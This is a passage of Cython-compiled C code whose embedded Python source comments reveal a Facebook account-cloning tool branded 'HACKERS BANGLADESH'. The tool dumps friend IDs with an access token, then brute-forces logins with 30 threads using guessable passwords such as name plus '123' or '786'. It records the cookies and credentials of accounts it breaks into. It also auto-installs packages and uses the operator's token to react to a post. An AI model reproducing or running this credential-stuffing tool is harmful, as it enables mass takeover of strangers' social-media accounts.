  __Pyx_GIVEREF(__pyx_tuple__48);

  /* "libme.pyx":705
 * 			exit("  [!] Token invalid")
 * 		try:
 * 			__total = int(input("\n  [!] How Much Account U Want Dump : "))             # <<<<<<<<<<<<<<
 * 		except:
 * 			__total = 1
 */
  __pyx_tuple__49 = PyTuple_Pack(1, __pyx_kp_s_How_Much_Account_U_Want_Dump); if (unlikely(!__pyx_tuple__49)) __PYX_ERR(0, 705, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__49);
  __Pyx_GIVEREF(__pyx_tuple__49);

  /* "libme.pyx":722
 * 					file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):
 * 				exit("  [!] Dump Failed, Maybe The User Is Wrong / Doesn't Have Friends")             # <<<<<<<<<<<<<<
 * 		file.close()
 * 		__id=open(_____, 'r').readlines()
 */
  __pyx_tuple__50 = PyTuple_Pack(1, __pyx_kp_s_Dump_Failed_Maybe_The_User_Is_W_2); if (unlikely(!__pyx_tuple__50)) __PYX_ERR(0, 722, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__50);
  __Pyx_GIVEREF(__pyx_tuple__50);

  /* "libme.pyx":734
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Please Dump File first %s not found"%(myfile))
 * 		ask = input("  [!] Password Method [y/t] : ")             # <<<<<<<<<<<<<<
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
  __pyx_tuple__51 = PyTuple_Pack(1, __pyx_kp_s_Password_Method_y_t); if (unlikely(!__pyx_tuple__51)) __PYX_ERR(0, 734, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__51);
  __Pyx_GIVEREF(__pyx_tuple__51);

  /* "libme.pyx":765
 * 	def __mennn__(self):
 * 		try:
 * 			pastefile = input('  [+] Enter your file : ')             # <<<<<<<<<<<<<<
 * 			for line in open(pastefile, 'r').readlines():
 * 				self.id.append(line.strip())
 */
  __pyx_tuple__52 = PyTuple_Pack(1, __pyx_kp_s_Enter_your_file); if (unlikely(!__pyx_tuple__52)) __PYX_ERR(0, 765, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__52);
  __Pyx_GIVEREF(__pyx_tuple__52);

  /* "libme.pyx":770
 * 		except(KeyError , IOError):
 * 			exit("\n [!] Your Path Wrong! Please Check File Path > %s "%(pastefile))
 * 		ask = input("  [!] Password method [y/t] : ")             # <<<<<<<<<<<<<<
 * 		if ask == "y":
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
  __pyx_tuple__53 = PyTuple_Pack(1, __pyx_kp_s_Password_method_y_t_2); if (unlikely(!__pyx_tuple__53)) __PYX_ERR(0, 770, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__53);
  __Pyx_GIVEREF(__pyx_tuple__53);

  /* "libme.pyx":774
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For example Separators : 445566,786786786")
 * 				listpass = input("  [+] Enter Password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 */
  __pyx_tuple__54 = PyTuple_Pack(1, __pyx_kp_s_Enter_Password); if (unlikely(!__pyx_tuple__54)) __PYX_ERR(0, 774, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__54);
  __Pyx_GIVEREF(__pyx_tuple__54);

  /* "libme.pyx":832
 * 			gaaa = ses.post(host+"/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 * 			if "c_user" in ses.cookies.get_dict().keys():
 * 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace("noscript=1;", "")             # <<<<<<<<<<<<<<
 * 				print("\r  \033[1;92m ~> %s|%s\033[0;97m"%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 */
  __pyx_tuple__57 = PyTuple_Pack(2, __pyx_kp_s_noscript_1, __pyx_kp_s_); if (unlikely(!__pyx_tuple__57)) __PYX_ERR(0, 832, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__57);
  __Pyx_GIVEREF(__pyx_tuple__57);

  /* "libme.pyx":867
 * 			exit("  [!] Token invalid")
 * 		try:
 * 			__total = int(input("\n  [?] How much link you want dump : "))             # <<<<<<<<<<<<<<
 * 		except:
 * 			__total = 1
 */
  __pyx_tuple__58 = PyTuple_Pack(1, __pyx_kp_s_How_much_link_you_want_dump_2); if (unlikely(!__pyx_tuple__58)) __PYX_ERR(0, 867, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__58);
  __Pyx_GIVEREF(__pyx_tuple__58);

  /* "libme.pyx":28
 * except ImportError:
 * 	print("\n ! james requests module is not installed")
 * 	os.system("pip install requests")             # <<<<<<<<<<<<<<
 * 
 * try:
 */
  __pyx_tuple__59 = PyTuple_Pack(1, __pyx_kp_s_pip_install_requests); if (unlikely(!__pyx_tuple__59)) __PYX_ERR(0, 28, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__59);
  __Pyx_GIVEREF(__pyx_tuple__59);

  /* "libme.pyx":34
 * except ImportError:
 * 	print("\n !.james bs4 module is not installed yet")
 * 	os.system("pip  install bs4")             # <<<<<<<<<<<<<<
 * try:
 * 	import concurrent.futures
 */
  __pyx_tuple__60 = PyTuple_Pack(1, __pyx_kp_s_pip_install_bs4); if (unlikely(!__pyx_tuple__60)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__60);
  __Pyx_GIVEREF(__pyx_tuple__60);

  /* "libme.pyx":39
 * except ImportError:
 * 	print("\n ! james futures module not installed")
 * 	os.system("pip install futures")             # <<<<<<<<<<<<<<
 * ct = datetime.now()
 * n = ct.month
 */
  __pyx_tuple__61 = PyTuple_Pack(1, __pyx_kp_s_pip_install_futures); if (unlikely(!__pyx_tuple__61)) __PYX_ERR(0, 39, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__61);
  __Pyx_GIVEREF(__pyx_tuple__61);

  /* "libme.pyx":60
 * date = ("%s %s %s"%(ha, op, ta))
 * bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
 * ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text             # <<<<<<<<<<<<<<
 * class James:
 * 	def __init__(self):
 */
  __pyx_tuple__62 = PyTuple_Pack(1, __pyx_kp_s_https_api_asutoolkit_cloudaccess); if (unlikely(!__pyx_tuple__62)) __PYX_ERR(0, 60, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__62);
  __Pyx_GIVEREF(__pyx_tuple__62);

  /* "libme.pyx":62
 * ip = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text
 * class James:
 * 	def __init__(self):             # <<<<<<<<<<<<<<
 * 		self.id = []
 * 		self.ok = []
 */
  __pyx_tuple__63 = PyTuple_Pack(1, __pyx_n_s_self); if (unlikely(!__pyx_tuple__63)) __PYX_ERR(0, 62, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__63);
  __Pyx_GIVEREF(__pyx_tuple__63);
  __pyx_codeobj__64 = (PyObject*)__Pyx_PyCode_New(1, 0, 1, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__63, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_init, 62, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__64)) __PYX_ERR(0, 62, __pyx_L1_error)

  /* "libme.pyx":70
 * 		key = open(".__apikey__.log", "r").read()
 * 	except IOError:
 * 		id1 = uuid.uuid4().hex[:10].upper()             # <<<<<<<<<<<<<<
 * 		id2 = uuid.uuid4().hex[:15].upper()
 * 		open(".__apikey__.log", "w").write(id1+id2+"==")
 */
  __pyx_slice__65 = PySlice_New(Py_None, __pyx_int_10, Py_None); if (unlikely(!__pyx_slice__65)) __PYX_ERR(0, 70, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_slice__65);
  __Pyx_GIVEREF(__pyx_slice__65);

  /* "libme.pyx":71
 * 	except IOError:
 * 		id1 = uuid.uuid4().hex[:10].upper()
 * 		id2 = uuid.uuid4().hex[:15].upper()             # <<<<<<<<<<<<<<
 * 		open(".__apikey__.log", "w").write(id1+id2+"==")
 * 
 */
  __pyx_slice__66 = PySlice_New(Py_None, __pyx_int_15, Py_None); if (unlikely(!__pyx_slice__66)) __PYX_ERR(0, 71, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_slice__66);
  __Pyx_GIVEREF(__pyx_slice__66);

  /* "libme.pyx":72
 * 		id1 = uuid.uuid4().hex[:10].upper()
 * 		id2 = uuid.uuid4().hex[:15].upper()
 * 		open(".__apikey__.log", "w").write(id1+id2+"==")             # <<<<<<<<<<<<<<
 * 
 * 	def __request__(self):
 */
  __pyx_tuple__67 = PyTuple_Pack(2, __pyx_kp_s_apikey___log, __pyx_n_s_w); if (unlikely(!__pyx_tuple__67)) __PYX_ERR(0, 72, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__67);
  __Pyx_GIVEREF(__pyx_tuple__67);

  /* "libme.pyx":74
 * 		open(".__apikey__.log", "w").write(id1+id2+"==")
 * 
 * 	def __request__(self):             # <<<<<<<<<<<<<<
 * 		os.system("clear")
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */
  __pyx_tuple__69 = PyTuple_Pack(4, __pyx_n_s_self, __pyx_n_s_xx, __pyx_n_s_lulu, __pyx_n_s_hulu); if (unlikely(!__pyx_tuple__69)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__69);
  __Pyx_GIVEREF(__pyx_tuple__69);
  __pyx_codeobj__70 = (PyObject*)__Pyx_PyCode_New(1, 0, 4, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__69, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_request, 74, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__70)) __PYX_ERR(0, 74, __pyx_L1_error)

  /* "libme.pyx":89
 * 			print( "  Talk To Admin For Key...\n")
 * 			os.system('xdg-open https://youtube.com/channel/UCgIVecO1e-lFuP_icxEL2mA')
 * 	def __start__(self):             # <<<<<<<<<<<<<<
 * 		os.system("clear")
 * 		try:
 */
  __pyx_tuple__71 = PyTuple_Pack(7, __pyx_n_s_self, __pyx_n_s_key, __pyx_n_s_a, __pyx_n_s_status, __pyx_n_s_expired, __pyx_n_s_choose, __pyx_n_s_apikey); if (unlikely(!__pyx_tuple__71)) __PYX_ERR(0, 89, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__71);
  __Pyx_GIVEREF(__pyx_tuple__71);
  __pyx_codeobj__72 = (PyObject*)__Pyx_PyCode_New(1, 0, 7, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__71, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_start, 89, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__72)) __PYX_ERR(0, 89, __pyx_L1_error)

  /* "libme.pyx":149
 * 			else:
 * 				exit("  [!] \033[1;31m Warning : \033[1;37m You Are Not Registered Yet, Please Choose Number 6")
 * 	def __fb__(self):             # <<<<<<<<<<<<<<
 * 		x = 11111111
 * 		xx = 99999999
 */
  __pyx_tuple__73 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_x, __pyx_n_s_xx, __pyx_n_s_idx, __pyx_n_s_limit, __pyx_n_s_i, __pyx_n_s_ib, __pyx_n_s_coeg, __pyx_n_s_listpass, __pyx_n_s_user, __pyx_n_s_e); if (unlikely(!__pyx_tuple__73)) __PYX_ERR(0, 149, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__73);
  __Pyx_GIVEREF(__pyx_tuple__73);
  __pyx_codeobj__74 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__73, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_fb, 149, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__74)) __PYX_ERR(0, 149, __pyx_L1_error)

  /* "libme.pyx":175
 * 			exit(str(e))
 * 
 * 	def __api__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */
  __pyx_tuple__75 = PyTuple_Pack(8, __pyx_n_s_self, __pyx_n_s_uid, __pyx_n_s_pwx, __pyx_n_s_ua, __pyx_n_s_url, __pyx_n_s_pw, __pyx_n_s_rex, __pyx_n_s_xo); if (unlikely(!__pyx_tuple__75)) __PYX_ERR(0, 175, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__75);
  __Pyx_GIVEREF(__pyx_tuple__75);
  __pyx_codeobj__76 = (PyObject*)__Pyx_PyCode_New(3, 0, 8, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__75, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_api, 175, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__76)) __PYX_ERR(0, 175, __pyx_L1_error)

  /* "libme.pyx":209
 * 				continue
 * 		self.loop +=1
 * 	def __fb4__(self):             # <<<<<<<<<<<<<<
 * 		x = 1111
 * 		xx = 9999
 */
  __pyx_tuple__77 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_x, __pyx_n_s_xx, __pyx_n_s_idx, __pyx_n_s_limit, __pyx_n_s_i, __pyx_n_s_ib, __pyx_n_s_coeg, __pyx_n_s_listpass, __pyx_n_s_user, __pyx_n_s_e); if (unlikely(!__pyx_tuple__77)) __PYX_ERR(0, 209, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__77);
  __Pyx_GIVEREF(__pyx_tuple__77);
  __pyx_codeobj__78 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__77, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_fb4, 209, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__78)) __PYX_ERR(0, 209, __pyx_L1_error)

  /* "libme.pyx":234
 * 		except Exception as e:
 * 			exit(str(e))
 * 	def __fb2__(self):             # <<<<<<<<<<<<<<
 * 		x = 11111111
 * 		xx = 99999999
 */
  __pyx_tuple__79 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_x, __pyx_n_s_xx, __pyx_n_s_idx, __pyx_n_s_limit, __pyx_n_s_i, __pyx_n_s_ib, __pyx_n_s_coeg, __pyx_n_s_listpass, __pyx_n_s_user, __pyx_n_s_e); if (unlikely(!__pyx_tuple__79)) __PYX_ERR(0, 234, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__79);
  __Pyx_GIVEREF(__pyx_tuple__79);
  __pyx_codeobj__80 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__79, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_fb2, 234, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__80)) __PYX_ERR(0, 234, __pyx_L1_error)

  /* "libme.pyx":259
 * 		except Exception as e:
 * 			exit(str(e))
 * 	def __fb3__(self):             # <<<<<<<<<<<<<<
 * 		x = 1111111
 * 		xx = 9999999
 */
  __pyx_tuple__81 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_x, __pyx_n_s_xx, __pyx_n_s_idx, __pyx_n_s_limit, __pyx_n_s_i, __pyx_n_s_ib, __pyx_n_s_coeg, __pyx_n_s_listpass, __pyx_n_s_user, __pyx_n_s_e); if (unlikely(!__pyx_tuple__81)) __PYX_ERR(0, 259, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__81);
  __Pyx_GIVEREF(__pyx_tuple__81);
  __pyx_codeobj__82 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__81, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_fb3, 259, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__82)) __PYX_ERR(0, 259, __pyx_L1_error)

  /* "libme.pyx":284
 * 		except Exception as e:
 * 			exit(str(e))
 * 	def __apii__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */
  __pyx_tuple__83 = PyTuple_Pack(8, __pyx_n_s_self, __pyx_n_s_uid, __pyx_n_s_pwx, __pyx_n_s_ua, __pyx_n_s_pw, __pyx_n_s_ses, __pyx_n_s_headers, __pyx_n_s_response); if (unlikely(!__pyx_tuple__83)) __PYX_ERR(0, 284, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__83);
  __Pyx_GIVEREF(__pyx_tuple__83);
  __pyx_codeobj__84 = (PyObject*)__Pyx_PyCode_New(3, 0, 8, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__83, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_apii, 284, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__84)) __PYX_ERR(0, 284, __pyx_L1_error)

  /* "libme.pyx":327
 * 				continue
 * 		self.loop +=1
 * 	def __login__(self):             # <<<<<<<<<<<<<<
 * 		os.system('clear')
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */
  __pyx_tuple__85 = PyTuple_Pack(3, __pyx_n_s_self, __pyx_n_s_token, __pyx_n_s_nama); if (unlikely(!__pyx_tuple__85)) __PYX_ERR(0, 327, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__85);
  __Pyx_GIVEREF(__pyx_tuple__85);
  __pyx_codeobj__86 = (PyObject*)__Pyx_PyCode_New(1, 0, 3, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__85, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_login, 327, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__86)) __PYX_ERR(0, 327, __pyx_L1_error)

  /* "libme.pyx":340
 * 			print("  [!]  Token Invalid")
 * 			self.login()
 * 	def __bot__follow__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open("login.txt","r").read()
 */
  __pyx_tuple__87 = PyTuple_Pack(6, __pyx_n_s_self, __pyx_n_s_token, __pyx_n_s_nama, __pyx_n_s_comment, __pyx_n_s_love, __pyx_n_s_james); if (unlikely(!__pyx_tuple__87)) __PYX_ERR(0, 340, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__87);
  __Pyx_GIVEREF(__pyx_tuple__87);
  __pyx_codeobj__88 = (PyObject*)__Pyx_PyCode_New(1, 0, 6, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__87, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_bot__follow, 340, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__88)) __PYX_ERR(0, 340, __pyx_L1_error)

  /* "libme.pyx":357
 * 		requests.post('https://graph.facebook.com/2867565956820659/reactions?type=love&access_token=' + token) #react
 * 		self.__menu__file__()
 * 	def __menu__file__(self):             # <<<<<<<<<<<<<<
 * 		os.system("clear")
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */
  __pyx_tuple__89 = PyTuple_Pack(3, __pyx_n_s_self, __pyx_n_s_nama, __pyx_n_s_james); if (unlikely(!__pyx_tuple__89)) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__89);
  __Pyx_GIVEREF(__pyx_tuple__89);
  __pyx_codeobj__90 = (PyObject*)__Pyx_PyCode_New(1, 0, 3, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__89, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_menu__file, 357, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__90)) __PYX_ERR(0, 357, __pyx_L1_error)

  /* "libme.pyx":392
 * 			self.__login__()
 * 
 * 	def __method__2__(self):             # <<<<<<<<<<<<<<
 * 		print("\n  \033[0;97m[1] Clone only 10000 to 10000000 account")
 * 		print("  [2] Clone All in one Account")
 */
  __pyx_tuple__91 = PyTuple_Pack(2, __pyx_n_s_self, __pyx_n_s_method__2); if (unlikely(!__pyx_tuple__91)) __PYX_ERR(0, 392, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__91);
  __Pyx_GIVEREF(__pyx_tuple__91);
  __pyx_codeobj__92 = (PyObject*)__Pyx_PyCode_New(1, 0, 2, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__91, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_method__2, 392, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__92)) __PYX_ERR(0, 392, __pyx_L1_error)

  /* "libme.pyx":407
 * 		elif __method__2__ == "3":
 * 			self.__menn__()
 * 	def __masal__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token =open('login.txt', 'r').read()
 */
  __pyx_tuple__93 = PyTuple_Pack(12, __pyx_n_s_self, __pyx_n_s_token, __pyx_n_s_total, __pyx_n_s_file_2, __pyx_n_s_zx, __pyx_n_s_ids, __pyx_n_s_rex, __pyx_n_s_ex, __pyx_n_s_file_3, __pyx_n_s_id, __pyx_n_s_a, __pyx_n_s_id_2); if (unlikely(!__pyx_tuple__93)) __PYX_ERR(0, 407, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__93);
  __Pyx_GIVEREF(__pyx_tuple__93);
  __pyx_codeobj__94 = (PyObject*)__Pyx_PyCode_New(1, 0, 12, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__93, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_masal, 407, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__94)) __PYX_ERR(0, 407, __pyx_L1_error)

  /* "libme.pyx":436
 * 		print("  \033[0;97m[] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra Dump File saved in > %s"%(__file))
 * 	def __1000__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			file = '/storage/emulated/0/1000.txt'
 */
  __pyx_tuple__95 = PyTuple_Pack(11, __pyx_n_s_self, __pyx_n_s_file_3, __pyx_n_s_line, __pyx_n_s_ask, __pyx_n_s_coeg, __pyx_n_s_listpass, __pyx_n_s_user, __pyx_n_s_uid, __pyx_n_s_name, __pyx_n_s_ft, __pyx_n_s_pwx); if (unlikely(!__pyx_tuple__95)) __PYX_ERR(0, 436, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__95);
  __Pyx_GIVEREF(__pyx_tuple__95);
  __pyx_codeobj__96 = (PyObject*)__Pyx_PyCode_New(1, 0, 11, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__95, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_1000, 436, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__96)) __PYX_ERR(0, 436, __pyx_L1_error)

  /* "libme.pyx":473
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__bapi__, uid, pwx)
 * 	def __masal2__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open('login.txt', 'r').read()
 */
  __pyx_tuple__98 = PyTuple_Pack(12, __pyx_n_s_self, __pyx_n_s_token, __pyx_n_s_total, __pyx_n_s__97, __pyx_n_s_zx, __pyx_n_s_ids, __pyx_n_s_rex, __pyx_n_s_ex, __pyx_n_s_file_3, __pyx_n_s_id, __pyx_n_s_a, __pyx_n_s_id_2); if (unlikely(!__pyx_tuple__98)) __PYX_ERR(0, 473, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__98);
  __Pyx_GIVEREF(__pyx_tuple__98);
  __pyx_codeobj__99 = (PyObject*)__Pyx_PyCode_New(1, 0, 12, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__98, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_libme_pyx, __pyx_n_s_masal2, 473, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__99)) __PYX_ERR(0, 473, __pyx_L1_error)

  /* "libme.pyx":501
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(____))
 * 	def __Frr__(self):             # <<<<<<<<<<<<<<
 * 		try:
